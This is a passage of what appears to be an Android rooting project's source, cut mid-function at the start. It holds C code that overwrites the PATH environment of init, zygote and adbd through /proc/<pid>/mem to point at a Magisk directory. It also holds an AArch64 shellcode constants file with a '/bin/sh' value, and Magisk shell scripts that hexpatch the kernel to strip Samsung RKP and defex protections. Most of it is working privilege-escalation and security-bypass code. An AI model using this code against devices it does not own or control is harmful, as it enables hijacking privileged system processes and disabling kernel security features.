		fprintf(stderr, "environ symbol not found. Symbols=%lu\n", symcount);
		return -1;
	}else{
		Elf32_Ehdr hdr;
		if(readbuf(fd, base, &hdr, sizeof(hdr))){
			return -1;
		}

		u64 dyn_off = 0;
		u64 dyn_size = 0;
		for(int i = 0; i < hdr.e_phnum; i++){
			Elf32_Phdr phdr;
			if(readbuf(fd, base + hdr.e_phoff + sizeof(Elf32_Phdr) * i, &phdr, sizeof(phdr))){
				return -1;
			}

			if(phdr.p_type == PT_DYNAMIC){
				dyn_off = phdr.p_vaddr;
				dyn_size = phdr.p_memsz;
			}
		}

		u64 strtab = 0;
		u64 symtab = 0;
		u64 gnu_hash = 0;
		int dyn_count = dyn_size / sizeof(Elf32_Dyn);
		for(int i = 0; i < dyn_count; i++){
			Elf32_Dyn dyn;
			if(readbuf(fd, base + dyn_off + sizeof(Elf32_Dyn) * i, &dyn, sizeof(dyn))){
				return -1;
			}

			if(dyn.d_tag == DT_STRTAB){
				strtab = dyn.d_un.d_val;
			}
			if(dyn.d_tag == DT_SYMTAB){
				symtab = dyn.d_un.d_ptr;
			}
			if(dyn.d_tag == DT_GNU_HASH){
				gnu_hash = dyn.d_un.d_ptr;
			}
		}

		// Get symbol count from DT_GNU_HASH

		struct gnu_hash gnu_hash_obj;
		if(readbuf(fd, base + gnu_hash, &gnu_hash_obj, sizeof(gnu_hash_obj))){
			return -1;
		}
		u64 bucket_offset = base + gnu_hash + sizeof(gnu_hash_obj) + sizeof(u32) * gnu_hash_obj.bloom_size;
		u64 chain_offset = bucket_offset + sizeof(u32) * gnu_hash_obj.nbuckets;
		u32 last_bucket;
		if(readbuf(fd, bucket_offset + sizeof(u32) * (gnu_hash_obj.nbuckets - 1), &last_bucket, sizeof(last_bucket))){
			return -1;
		}
		//printf("nbu: %d symoffset: %d  %d,%d  last:%d\n", gnu_hash_obj.nbuckets, gnu_hash_obj.symoffset, gnu_hash_obj.bloom_size, gnu_hash_obj.bloom_shift, last_bucket);
		u64 symcount = 0;

		for(int i = 0;; i++){
			u32 last_sym = 0;
			if(readbuf(fd, chain_offset + sizeof(u32) * (last_bucket - gnu_hash_obj.symoffset + i), &last_sym, sizeof(last_sym))){
				return -1;
			}
			//printf("%d: %08x\n", i, last_sym);
			if(last_sym & 1){
				// last sym
				symcount = last_bucket + i + 1;
				break;
			}
		}

		// Linear search for dynamic symbols

		fprintf(stderr, "Symbol count: %lu\n", symcount);
		for(int i = 0; i < symcount; i++){
			Elf32_Sym sym;
			if(readbuf(fd, base + symtab + i * sizeof(Elf32_Sym), &sym, sizeof(sym))){
				return -1;
			}
			char name[100] = {};
			if(readbuf(fd, base + sym.st_name + strtab, name, sizeof(name) - 1)){
				return -1;
			}
			//printf("name[%d]: %s\n", i, name);
			if(strcmp(name, "environ") == 0){
				*addr = sym.st_value;
				return 0;
			}
		}
		fprintf(stderr, "environ symbol not found. Symbols=%lu\n", symcount);
		return -1;
	}

}

void patch_env(int pid, bool is64){
	char path[100];
	sprintf(path, "/proc/%d/maps", pid);

	FILE *fp = fopen(path, "r");
	if(fp == NULL){
		perror("fopen");
		return;
	}
	char buf[1000];
	unsigned long addr = 0;
	while(fgets(buf, sizeof(buf), fp)){
		int len = strlen(buf);
		if(len >= 1 && buf[len - 1] == '\0'){
			buf[len - 1] = 0;
		}
		if((pid == 1 && strstr(buf, LIBINIT64)) ||
				strstr(buf, is64 ? LIB64 : LIB32)){
			char *p = strchr(buf, '-');
			if(p){
				*p = 0;
				addr = strtoul(buf, NULL, 16);
				fprintf(stderr, "Found libc base: %lx (%s)\n", addr, buf);
				break;
			}

			break;
		}
	}
	fclose(fp);

	if(addr == 0){
		fprintf(stderr, "Failed to find libc.so base addr on %d\n", pid);
		return;
	}

	fprintf(stderr, "Base: %08lx\n", addr);

	sprintf(path, "/proc/%d/mem", pid);

	int fd = open(path, O_RDWR);
	if(fd < 0){
		perror("open mem");
		return;
	}

	u64 environ_addr = 0;
	if(get_environ_addr(fd, is64, addr, &environ_addr)){
		close(fd);
		return;
	}
	int wordsize = is64 ? 8 : 4;
	u64 environ_val = 0;
	if(readbuf(fd, addr + environ_addr, &environ_val, wordsize)){
		close(fd);
		return;
	}
	fprintf(stderr, "environ=%lx\n", environ_val);
	u64 env0_val = 0;
	if(readbuf(fd, environ_val, &env0_val, wordsize)){
		close(fd);
		return;
	}
	char buf2[100];
	if(readbuf(fd, env0_val, &buf2, sizeof(buf2) - 1)){
		close(fd);
		return;
	}
	buf2[sizeof(buf2) - 1] = 0;
	fprintf(stderr, "Current : %s\n", buf2);

	const char *prefix  = "PATH=/product/bin:";
	const char *patched = "PATH=/dev/.magisk:";
	// Check if not patched.
	if(strncmp(buf2, prefix, strlen(prefix)) == 0){
		fprintf(stderr, "Patching...\n");
		// Patch.
		if(writebuf(fd, env0_val, patched, strlen(patched))){
			close(fd);
			fprintf(stderr, "Failed to write env\n");
			return;
		}
		fprintf(stderr, "Done.\n");
	} else {
		fprintf(stderr, "Already patched.\n");
	}

	close(fd);
}

int main() {
	// Patch init env.
	fprintf(stderr, "Patching init env.\n");
	patch_env(1, false);

	DIR *d = opendir("/proc");

	while(1){
		struct dirent *ent = readdir(d);
		if(ent == NULL){
			break;
		}
		if('0' <= ent->d_name[0] && ent->d_name[0] <= '9') {
			int pid = atoi(ent->d_name);
			char path[100];
			sprintf(path, "/proc/%d", pid);

			// Check zygote process uid

			struct stat st;
			if(stat(path, &st) < 0){
				continue;
			}
			if(!S_ISDIR(st.st_mode)){
				continue;
			}
			if(st.st_uid != 0 && st.st_uid != 2000){
				continue;
			}

			// Check if cmdline equals zygote/adbd

			sprintf(path, "/proc/%d/cmdline", pid);
			int fd = open(path, O_RDONLY);
			if(fd < 0){
				continue;
			}
			char buf[100];
			read(fd, buf, sizeof(buf) - 1);
			buf[sizeof(buf) - 1] = 0;
			close(fd);

			if(st.st_uid == 0){
				if(strcmp(buf, "zygote") == 0){
					fprintf(stderr, "Pid: %d name: %s\n", pid, buf);
					patch_env(pid, false);
				}else if(strcmp(buf, "zygote64") == 0){
					fprintf(stderr, "Pid: %d name: %s\n", pid, buf);
					patch_env(pid, true);
				}
			}else if(st.st_uid == 2000){
				if(strcmp(buf, "/apex/com.android.adbd/bin/adbd") == 0){
					fprintf(stderr, "Pid: %d name: %s\n", pid, buf);
					patch_env(pid, true);
				}
			}
		}

	}
	closedir(d);
}

```

`include.inc`:

```inc
 /**
  Copyright © 2018 Odzhan. All Rights Reserved.

  Redistribution and use in source and binary forms, with or without
  modification, are permitted provided that the following conditions are
  met:

  1. Redistributions of source code must retain the above copyright
  notice, this list of conditions and the following disclaimer.

  2. Redistributions in binary form must reproduce the above copyright
  notice, this list of conditions and the following disclaimer in the
  documentation and/or other materials provided with the distribution.

  3. The name of the author may not be used to endorse or promote products
  derived from this software without specific prior written permission.

  THIS SOFTWARE IS PROVIDED BY AUTHORS "AS IS" AND ANY EXPRESS OR
  IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
  WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
  DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,
  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
  (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
  STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
  POSSIBILITY OF SUCH DAMAGE. */

  // symbolic constants for Linux/AArch64

  .equ BINSH,                0x0068732F6E69622F

  .equ BUFSIZ,               64
  .equ NULL,                  0
  .equ SIGCHLD,              17
        
  // sched.h
  .equ CSIGNAL,              0x000000FF // signal mask to be sent at exit
  .equ CLONE_VM,             0x00000100 // set if VM shared between processes
  .equ CLONE_FS,             0x00000200 // set if fs info shared between processes
  .equ CLONE_FILES,          0x00000400 // set if open files shared between processes
  .equ CLONE_SIGHAND,        0x00000800 // set if signal handlers and blocked signals shared
  .equ CLONE_PTRACE,         0x00002000 // set if we want to let tracing continue on the child too
  .equ CLONE_VFORK,          0x00004000 // set if the parent wants the child to wake it up on mm_release
  .equ CLONE_PARENT,         0x00008000 // set if we want to have the same parent as the cloner
  .equ CLONE_THREAD,         0x00010000 // Same thread group?
  .equ CLONE_NEWNS,          0x00020000 // New mount namespace group
  .equ CLONE_SYSVSEM,        0x00040000 // share system V SEM_UNDO semantics
  .equ CLONE_SETTLS,         0x00080000 // create a new TLS for the child
  .equ CLONE_PARENT_SETTID,  0x00100000 // set the TID in the parent
  .equ CLONE_CHILD_CLEARTID, 0x00200000 // clear the TID in the child
  .equ CLONE_DETACHED,       0x00400000 // Unused, ignored
  .equ CLONE_UNTRACED,       0x00800000 // set if the tracing process can't force CLONE_PTRACE
  .equ CLONE_CHILD_SETTID,   0x01000000 // set the TID in the child
  .equ CLONE_NEWCGROUP,      0x02000000 // New cgroup namespace
  .equ CLONE_NEWUTS,         0x04000000 // New utsname namespace
  .equ CLONE_NEWIPC,         0x08000000 // New ipc namespace
  .equ CLONE_NEWUSER,        0x10000000 // New user namespace
  .equ CLONE_NEWPID,         0x20000000 // New pid namespace
  .equ CLONE_NEWNET,         0x40000000 // New network namespace
  .equ CLONE_IO,             0x80000000 // Clone io context

  // fcntl.h
  .equ O_ACCMODE, 00000003
  .equ O_RDONLY,  00000000
  .equ O_WRONLY,  00000001
  .equ O_RDWR,    00000002
  .equ O_CREAT,   00000100
  .equ O_EXCL,    00000200
  .equ O_NOCTTY,  00000400
  .equ O_TRUNC,   00001000
  .equ O_APPEND,  00002000
  .equ O_NONBLOCK,00004000
  .equ O_CLOEXEC, 02000000
  
  .equ SHUT_RDWR,            2

  .equ STDIN_FILENO,         0
  .equ STDOUT_FILENO,        1
  .equ STDERR_FILENO,        2

  .equ AF_UNIX,              1
  .equ AF_INET,              2
  .equ SOCK_STREAM,          1
  .equ SOCK_DGRAM,           2
  .equ IPPROTO_IP,           0

  // epoll.h
  .equ EPOLLIN,              0x001
  .equ EPOLLPRI,             0x002
  .equ EPOLLOUT,             0x004
  .equ EPOLLERR,             0x008
  .equ EPOLLHUP,             0x010
  .equ EPOLLRDNORM,          0x040
  .equ EPOLLRDBAND,          0x080
  .equ EPOLLWRNORM,          0x100
  .equ EPOLLWRBAND,          0x200
  .equ EPOLLMSG,             0x400
  
  .equ EPOLLEXCLUSIVE,       1 << 28
  .equ EPOLLWAKEUP,          1 << 29
  .equ EPOLLONESHOT,         1 << 30
  .equ EPOLLET,              1 << 31

  .equ EPOLL_CTL_ADD,        1
  .equ EPOLL_CTL_DEL,        2
  .equ EPOLL_CTL_MOD,        3

  // Linux/AArch64 system calls
  .equ SYS_epoll_create1,   20    
  .equ SYS_epoll_ctl,       21 
  .equ SYS_epoll_pwait,     22    
  .equ SYS_dup3,            24
  .equ SYS_fcntl,           25
  .equ SYS_statfs,          43
  .equ SYS_faccessat,       48
  .equ SYS_chroot,          51
  .equ SYS_fchmodat,        53
  .equ SYS_openat,          56
  .equ SYS_close,           57 
  .equ SYS_pipe2,           59    
  .equ SYS_read,            63 
  .equ SYS_write,           64 
  .equ SYS_writev,          66
  .equ SYS_pselect6,        72
  .equ SYS_ppoll,           73
  .equ SYS_splice,          76
  .equ SYS_exit,            93 
  .equ SYS_waitid,          95
  .equ SYS_futex,           98
  .equ SYS_kill,           129
  .equ SYS_reboot,         142
  .equ SYS_setuid,         146
  .equ SYS_setsid,         157
  .equ SYS_uname,          160
  .equ SYS_getpid,         172
  .equ SYS_getppid,        173
  .equ SYS_getuid,         174
  .equ SYS_getgid,         176 
  .equ SYS_gettid,         178
  .equ SYS_socket,         198 
  .equ SYS_bind,           200 
  .equ SYS_listen,         201
  .equ SYS_accept,         202
  .equ SYS_connect,        203
  .equ SYS_sendto,         206
  .equ SYS_recvfrom,       207
  .equ SYS_setsockopt,     208
  .equ SYS_getsockopt,     209
  .equ SYS_shutdown,       210
  .equ SYS_munmap,         215
  .equ SYS_clone,          220
  .equ SYS_execve,         221
  .equ SYS_mmap,           222
  .equ SYS_mprotect,       226
  .equ SYS_wait4,          260
  .equ SYS_getrandom,      278
  .equ SYS_memfd_create,   279
  .equ SYS_access,        1033
  .equ SYS_init_module,    105
  .equ SYS_lseek,           62
  .equ SYS_readlinkat,      78

  .equ EAGAIN,              11
  .equ SEEK_DATA,            3
  .equ MAP_SHARED,         0x1
  .equ MAP_PRIVATE,        0x2
  .equ PROT_READ,          0x1
  .equ PROT_WRITE,         0x2
  .equ PROT_EXEC,          0x4

  // load a 64-bit immediate using MOV
  .macro movq Xn, imm
      movz    \Xn,  \imm & 0xFFFF
      movk    \Xn, (\imm >> 16) & 0xFFFF, lsl 16
      movk    \Xn, (\imm >> 32) & 0xFFFF, lsl 32
      movk    \Xn, (\imm >> 48) & 0xFFFF, lsl 48
  .endm

  // load a 32-bit immediate using MOV
  .macro movl Wn, imm
      movz    \Wn,  \imm & 0xFFFF
      movk    \Wn, (\imm >> 16) & 0xFFFF, lsl 16
  .endm

  // simulate a push operation
  .macro push Rn:req
      str     \Rn, [sp, -16]
  .endm

  // simulate a pop operation
  .macro pop R:req
      ldr     \Rn, [sp], 16
  .endm


```

`magisk/boot_patch.sh`:

```sh
#!/system/bin/sh
#######################################################################################
# Magisk Boot Image Patcher
#######################################################################################
#
# Usage: boot_patch.sh <bootimage>
#
# The following flags can be set in environment variables:
# KEEPVERITY, KEEPFORCEENCRYPT, RECOVERYMODE
#
# This script should be placed in a directory with the following files:
#
# File name          Type      Description
#
# boot_patch.sh      script    A script to patch boot image for Magisk.
#                  (this file) The script will use files in its same
#                              directory to complete the patching process
# util_functions.sh  script    A script which hosts all functions required
#                              for this script to work properly
# magiskinit         binary    The binary to replace /init
# magisk(32/64)      binary    The magisk binaries
# magiskboot         binary    A tool to manipulate boot images
# chromeos           folder    This folder includes the utility and keys to sign
#                  (optional)  chromeos boot images. Only used for Pixel C.
#
#######################################################################################

############
# Functions
############

# Pure bash dirname implementation
getdir() {
  case "$1" in
    */*)
      dir=${1%/*}
      if [ -z $dir ]; then
        echo "/"
      else
        echo $dir
      fi
    ;;
    *) echo "." ;;
  esac
}

#################
# Initialization
#################

if [ -z $SOURCEDMODE ]; then
  # Switch to the location of the script file
  cd "$(getdir "${BASH_SOURCE:-$0}")"
  # Load utility functions
  . ./util_functions.sh
  # Check if 64-bit
  api_level_arch_detect
fi

BOOTIMAGE="$1"
[ -e "$BOOTIMAGE" ] || abort "$BOOTIMAGE does not exist!"

# Dump image for MTD/NAND character device boot partitions
if [ -c "$BOOTIMAGE" ]; then
  nanddump -f boot.img "$BOOTIMAGE"
  BOOTNAND="$BOOTIMAGE"
  BOOTIMAGE=boot.img
fi

# Flags
[ -z $KEEPVERITY ] && KEEPVERITY=false
[ -z $KEEPFORCEENCRYPT ] && KEEPFORCEENCRYPT=false
[ -z $PATCHVBMETAFLAG ] && PATCHVBMETAFLAG=false
[ -z $RECOVERYMODE ] && RECOVERYMODE=false
export KEEPVERITY
export KEEPFORCEENCRYPT
export PATCHVBMETAFLAG

chmod -R 755 .

#########
# Unpack
#########

CHROMEOS=false

ui_print "- Unpacking boot image"
./magiskboot unpack "$BOOTIMAGE"

case $? in
  0 ) ;;
  1 )
    abort "! Unsupported/Unknown image format"
    ;;
  2 )
    ui_print "- ChromeOS boot image detected"
    CHROMEOS=true
    ;;
  * )
    abort "! Unable to unpack boot image"
    ;;
esac

###################
# Ramdisk Restores
###################

# Test patch status and do restore
ui_print "- Checking ramdisk status"
if [ -e ramdisk.cpio ]; then
  ./magiskboot cpio ramdisk.cpio test
  STATUS=$?
else
  # Stock A only system-as-root
  STATUS=0
fi
case $((STATUS & 3)) in
  0 )  # Stock boot
    ui_print "- Stock boot image detected"
    SHA1=$(./magiskboot sha1 "$BOOTIMAGE" 2>/dev/null)
    cat $BOOTIMAGE > stock_boot.img
    cp -af ramdisk.cpio ramdisk.cpio.orig 2>/dev/null
    ;;
  1 )  # Magisk patched
    ui_print "- Magisk patched boot image detected"
    # Find SHA1 of stock boot image
    [ -z $SHA1 ] && SHA1=$(./magiskboot cpio ramdisk.cpio sha1 2>/dev/null)
    ./magiskboot cpio ramdisk.cpio restore
    cp -af ramdisk.cpio ramdisk.cpio.orig
    rm -f stock_boot.img
    ;;
  2 )  # Unsupported
    ui_print "! Boot image patched by unsupported programs"
    abort "! Please restore back to stock boot image"
    ;;
esac

# Work around custom legacy Sony /init -> /(s)bin/init_sony : /init.real setup
INIT=init
if [ $((STATUS & 4)) -ne 0 ]; then
  INIT=init.real
fi

##################
# Ramdisk Patches
##################

ui_print "- Patching ramdisk"

echo "KEEPVERITY=$KEEPVERITY" > config
echo "KEEPFORCEENCRYPT=$KEEPFORCEENCRYPT" >> config
echo "PATCHVBMETAFLAG=$PATCHVBMETAFLAG" >> config
echo "RECOVERYMODE=$RECOVERYMODE" >> config
[ ! -z $SHA1 ] && echo "SHA1=$SHA1" >> config

# Compress to save precious ramdisk space
SKIP32="#"
SKIP64="#"
if [ -f magisk32 ]; then
  ./magiskboot compress=xz magisk32 magisk32.xz
  unset SKIP32
fi
if [ -f magisk64 ]; then
  ./magiskboot compress=xz magisk64 magisk64.xz
  unset SKIP64
fi

./magiskboot cpio ramdisk.cpio \
"add 0750 $INIT magiskinit" \
"mkdir 0750 overlay.d" \
"mkdir 0750 overlay.d/sbin" \
"$SKIP32 add 0644 overlay.d/sbin/magisk32.xz magisk32.xz" \
"$SKIP64 add 0644 overlay.d/sbin/magisk64.xz magisk64.xz" \
"patch" \
"backup ramdisk.cpio.orig" \
"mkdir 000 .backup" \
"add 000 .backup/.magisk config"

rm -f ramdisk.cpio.orig config magisk*.xz

#################
# Binary Patches
#################

for dt in dtb kernel_dtb extra; do
  [ -f $dt ] && ./magiskboot dtb $dt patch && ui_print "- Patch fstab in $dt"
done

if [ -f kernel ]; then
  # Remove Samsung RKP
  ./magiskboot hexpatch kernel \
  49010054011440B93FA00F71E9000054010840B93FA00F7189000054001840B91FA00F7188010054 \
  A1020054011440B93FA00F7140020054010840B93FA00F71E0010054001840B91FA00F7181010054

  # Remove Samsung defex
  # Before: [mov w2, #-221]   (-__NR_execve)
  # After:  [mov w2, #-32768]
  ./magiskboot hexpatch kernel 821B8012 E2FF8F12

  # Force kernel to load rootfs
  # skip_initramfs -> want_initramfs
  ./magiskboot hexpatch kernel \
  736B69705F696E697472616D667300 \
  77616E745F696E697472616D667300
fi

#################
# Repack & Flash
#################

ui_print "- Repacking boot image"
./magiskboot repack "$BOOTIMAGE" || abort "! Unable to repack boot image"

# Sign chromeos boot
$CHROMEOS && sign_chromeos

# Restore the original boot partition path
[ -e "$BOOTNAND" ] && BOOTIMAGE="$BOOTNAND"

# Reset any error code
true

```

`magisk/util_functions.sh`:

```sh
############################################
# Magisk General Utility Functions
############################################

MAGISK_VER='24.3'
MAGISK_VER_CODE=24300

###################
# Helper Functions
###################

ui_print() {
  if $BOOTMODE; then
    echo "$1"
  else
    echo -e "ui_print $1\nui_print" >> /proc/self/fd/$OUTFD
  fi
}

toupper() {
  echo "$@" | tr '[:lower:]' '[:upper:]'
}

grep_cmdline() {
  local REGEX="s/^$1=//p"
  { echo $(cat /proc/cmdline)$(sed -e 's/[^"]//g' -e 's/""//g' /proc/cmdline) | xargs -n 1; \
    sed -e 's/ = /=/g' -e 's/, /,/g' -e 's/"//g' /proc/bootconfig; \
  } 2>/dev/null | sed -n "$REGEX"
}

grep_prop() {
  local REGEX="s/^$1=//p"
  shift
  local FILES=$@
  [ -z "$FILES" ] && FILES='/system/build.prop'
  cat $FILES 2>/dev/null | dos2unix | sed -n "$REGEX" | head -n 1
}

grep_get_prop() {
  local result=$(grep_prop $@)
  if [ -z "$result" ]; then
    # Fallback to getprop
    getprop "$1"
  else
    echo $result
  fi
}

getvar() {
  local VARNAME=$1
  local VALUE
  local PROPPATH='/data/.magisk /cache/.magisk'
  [ ! -z $MAGISKTMP ] && PROPPATH="$MAGISKTMP/config $PROPPATH"
  VALUE=$(grep_prop $VARNAME $PROPPATH)
  [ ! -z $VALUE ] && eval $VARNAME=\$VALUE
}

is_mounted() {
  grep -q " $(readlink -f $1) " /proc/mounts 2>/dev/null
  return $?
}

abort() {
  ui_print "$1"
  $BOOTMODE || recovery_cleanup
  [ ! -z $MODPATH ] && rm -rf $MODPATH
  rm -rf $TMPDIR
  exit 1
}

resolve_vars() {
  MAGISKBIN=$NVBASE/magisk
  POSTFSDATAD=$NVBASE/post-fs-data.d
  SERVICED=$NVBASE/service.d
}

print_title() {
  local len line1len line2len bar
  line1len=$(echo -n $1 | wc -c)
  line2len=$(echo -n $2 | wc -c)
  len=$line2len
  [ $line1len -gt $line2len ] && len=$line1len
  len=$((len + 2))
  bar=$(printf "%${len}s" | tr ' ' '*')
  ui_print "$bar"
  ui_print " $1 "
  [ "$2" ] && ui_print " $2 "
  ui_print "$bar"
}

######################
# Environment Related
######################

setup_flashable() {
  ensure_bb
  $BOOTMODE && return
  if [ -z $OUTFD ] || readlink /proc/$$/fd/$OUTFD | grep -q /tmp; then
    # We will have to manually find out OUTFD
    for FD in `ls /proc/$$/fd`; do
      if readlink /proc/$$/fd/$FD | grep -q pipe; then
        if ps | grep -v grep | grep -qE " 3 $FD |status_fd=$FD"; then
          OUTFD=$FD
          break
        fi
      fi
    done
  fi
  recovery_actions
}

ensure_bb() {
  if set -o | grep -q standalone; then
    # We are definitely in busybox ash
    set -o standalone
    return
  fi

  # Find our busybox binary
  local bb
  if [ -f $TMPDIR/busybox ]; then
    bb=$TMPDIR/busybox
  elif [ -f $MAGISKBIN/busybox ]; then
    bb=$MAGISKBIN/busybox
  else
    abort "! Cannot find BusyBox"
  fi
  chmod 755 $bb

  # Busybox could be a script, make sure /system/bin/sh exists
  if [ ! -f /system/bin/sh ]; then
    umount -l /system 2>/dev/null
    mkdir -p /system/bin
    ln -s $(command -v sh) /system/bin/sh
  fi

  export ASH_STANDALONE=1

  # Find our current arguments
  # Run in busybox environment to ensure consistent results
  # /proc/<pid>/cmdline shall be <interpreter> <script> <arguments...>
  local cmds="$($bb sh -c "
  for arg in \$(tr '\0' '\n' < /proc/$$/cmdline); do
    if [ -z \"\$cmds\" ]; then
      # Skip the first argument as we want to change the interpreter
      cmds=\"sh\"
    else
      cmds=\"\$cmds '\$arg'\"
    fi
  done
  echo \$cmds")"

  # Re-exec our script
  echo $cmds | $bb xargs $bb
  exit
}

recovery_actions() {
  # Make sure random won't get blocked
  mount -o bind /dev/urandom /dev/random
  # Unset library paths
  OLD_LD_LIB=$LD_LIBRARY_PATH
  OLD_LD_PRE=$LD_PRELOAD
  OLD_LD_CFG=$LD_CONFIG_FILE
  unset LD_LIBRARY_PATH
  unset LD_PRELOAD
  unset LD_CONFIG_FILE
}

recovery_cleanup() {
  local DIR
  ui_print "- Unmounting partitions"
  (umount_apex
  if [ ! -d /postinstall/tmp ]; then
    umount -l /system
    umount -l /system_root
  fi
  umount -l /vendor
  umount -l /persist
  umount -l /metadata
  for DIR in /apex /system /system_root; do
    if [ -L "${DIR}_link" ]; then
      rmdir $DIR
      mv -f ${DIR}_link $DIR
    fi
  done
  umount -l /dev/random) 2>/dev/null
  [ -z $OLD_LD_LIB ] || export LD_LIBRARY_PATH=$OLD_LD_LIB
  [ -z $OLD_LD_PRE ] || export LD_PRELOAD=$OLD_LD_PRE
  [ -z $OLD_LD_CFG ] || export LD_CONFIG_FILE=$OLD_LD_CFG
}

#######################
# Installation Related
#######################

# find_block [partname...]
find_block() {
  local BLOCK DEV DEVICE DEVNAME PARTNAME UEVENT
  for BLOCK in "$@"; do
    DEVICE=`find /dev/block \( -type b -o -type c -o -type l \) -iname $BLOCK | head -n 1` 2>/dev/null
    if [ ! -z $DEVICE ]; then
      readlink -f $DEVICE
      return 0
    fi
  done
  # Fallback by parsing sysfs uevents
  for UEVENT in /sys/dev/block/*/uevent; do
    DEVNAME=`grep_prop DEVNAME $UEVENT`
    PARTNAME=`grep_prop PARTNAME $UEVENT`
    for BLOCK in "$@"; do
      if [ "$(toupper $BLOCK)" = "$(toupper $PARTNAME)" ]; then
        echo /dev/block/$DEVNAME
        return 0
      fi
    done
  done
  # Look just in /dev in case we're dealing with MTD/NAND without /dev/block devices/links
  for DEV in "$@"; do
    DEVICE=`find /dev \( -type b -o -type c -o -type l \) -maxdepth 1 -iname $DEV | head -n 1` 2>/dev/null
    if [ ! -z $DEVICE ]; then
      readlink -f $DEVICE
      return 0
    fi
  done
  return 1
}

# setup_mntpoint <mountpoint>
setup_mntpoint() {
  local POINT=$1
  [ -L $POINT ] && mv -f $POINT ${POINT}_link
  if [ ! -d $POINT ]; then
    rm -f $POINT
    mkdir -p $POINT
  fi
}

# mount_name <partname(s)> <mountpoint> <flag>
mount_name() {
  local PART=$1
  local POINT=$2
  local FLAG=$3
  setup_mntpoint $POINT
  is_mounted $POINT && return
  # First try mounting with fstab
  mount $FLAG $POINT 2>/dev/null
  if ! is_mounted $POINT; then
    local BLOCK=$(find_block $PART)
    mount $FLAG $BLOCK $POINT || return
  fi
  ui_print "- Mounting $POINT"
}

# mount_ro_ensure <partname(s)> <mountpoint>
mount_ro_ensure() {
  # We handle ro partitions only in recovery
  $BOOTMODE && return
  local PART=$1
  local POINT=$2
  mount_name "$PART" $POINT '-o ro'
  is_mounted $POINT || abort "! Cannot mount $POINT"
}

mount_partitions() {
  # Check A/B slot
  SLOT=`grep_cmdline androidboot.slot_suffix`
  if [ -z $SLOT ]; then
    SLOT=`grep_cmdline androidboot.slot`
    [ -z $SLOT ] || SLOT=_${SLOT}
  fi
  [ -z $SLOT ] || ui_print "- Current boot slot: $SLOT"

  # Mount ro partitions
  if is_mounted /system_root; then
    umount /system 2&>/dev/null
    umount /system_root 2&>/dev/null
  fi
  mount_ro_ensure "system$SLOT app$SLOT" /system
  if [ -f /system/init -o -L /system/init ]; then
    SYSTEM_ROOT=true
    setup_mntpoint /system_root
    if ! mount --move /system /system_root; then
      umount /system
      umount -l /system 2>/dev/null
      mount_ro_ensure "system$SLOT app$SLOT" /system_root
    fi
    mount -o bind /system_root/system /system
  else
    SYSTEM_ROOT=false
    grep ' / ' /proc/mounts | grep -qv 'rootfs' || grep -q ' /system_root ' /proc/mounts && SYSTEM_ROOT=true
  fi
  # /vendor is used only on some older devices for recovery AVBv1 signing so is not critical if fails
  [ -L /system/vendor ] && mount_name vendor$SLOT /vendor '-o ro'
  $SYSTEM_ROOT && ui_print "- Device is system-as-root"

  # Allow /system/bin commands (dalvikvm) on Android 10+ in recovery
  $BOOTMODE || mount_apex
}

# loop_setup <ext4_img>, sets LOOPDEV
loop_setup() {
  unset LOOPDEV
  local LOOP
  local MINORX=1
  [ -e /dev/block/loop1 ] && MINORX=$(stat -Lc '%T' /dev/block/loop1)
  local NUM=0
  while [ $NUM -lt 64 ]; do
    LOOP=/dev/block/loop$NUM
    [ -e $LOOP ] || mknod $LOOP b 7 $((NUM * MINORX))
    if losetup $LOOP "$1" 2>/dev/null; then
      LOOPDEV=$LOOP
      break
    fi
    NUM=$((NUM + 1))
  done
}

mount_apex() {
  $BOOTMODE || [ ! -d /system/apex ] && return
  local APEX DEST
  setup_mntpoint /apex
  mount -t tmpfs tmpfs /apex -o mode=755
  local PATTERN='s/.*"name":[^"]*"\([^"]*\).*/\1/p'
  for APEX in /system/apex/*; do
    if [ -f $APEX ]; then
      # handle CAPEX APKs, extract actual APEX APK first
      unzip -qo $APEX original_apex -d /apex
      [ -f /apex/original_apex ] && APEX=/apex/original_apex # unzip doesn't do return codes
      # APEX APKs, extract and loop mount
      unzip -qo $APEX apex_payload.img -d /apex
      DEST=$(unzip -qp $APEX apex_manifest.pb | strings | head -n 1)
      [ -z $DEST ] && DEST=$(unzip -qp $APEX apex_manifest.json | sed -n $PATTERN)
      [ -z $DEST ] && continue
      DEST=/apex/$DEST
      mkdir -p $DEST
      loop_setup /apex/apex_payload.img
      if [ ! -z $LOOPDEV ]; then
        ui_print "- Mounting $DEST"
        mount -t ext4 -o ro,noatime $LOOPDEV $DEST
      fi
      rm -f /apex/original_apex /apex/apex_payload.img
    elif [ -d $APEX ]; then
      # APEX folders, bind mount directory
      if [ -f $APEX/apex_manifest.json ]; then
        DEST=/apex/$(sed -n $PATTERN $APEX/apex_manifest.json)
      elif [ -f $APEX/apex_manifest.pb ]; then
        DEST=/apex/$(strings $APEX/apex_manifest.pb | head -n 1)
      else
        continue
      fi
      mkdir -p $DEST
      ui_print "- Mounting $DEST"
      mount -o bind $APEX $DEST
    fi
  done
  export ANDROID_RUNTIME_ROOT=/apex/com.android.runtime
  export ANDROID_TZDATA_ROOT=/apex/com.android.tzdata
  export ANDROID_ART_ROOT=/apex/com.android.art
  export ANDROID_I18N_ROOT=/apex/com.android.i18n
  local APEXJARS=$(find /apex -name '*.jar' | sort | tr '\n' ':')
  local FWK=/system/framework
  export BOOTCLASSPATH=${APEXJARS}\
$FWK/framework.jar:$FWK/ext.jar:$FWK/telephony-common.jar:\
$FWK/voip-common.jar:$FWK/ims-common.jar:$FWK/telephony-ext.jar
}

umount_apex() {
  [ -d /apex ] || return
  umount -l /apex
  for loop in /dev/block/loop*; do
    losetup -d $loop 2>/dev/null
  done
  unset ANDROID_RUNTIME_ROOT
  unset ANDROID_TZDATA_ROOT
  unset ANDROID_ART_ROOT
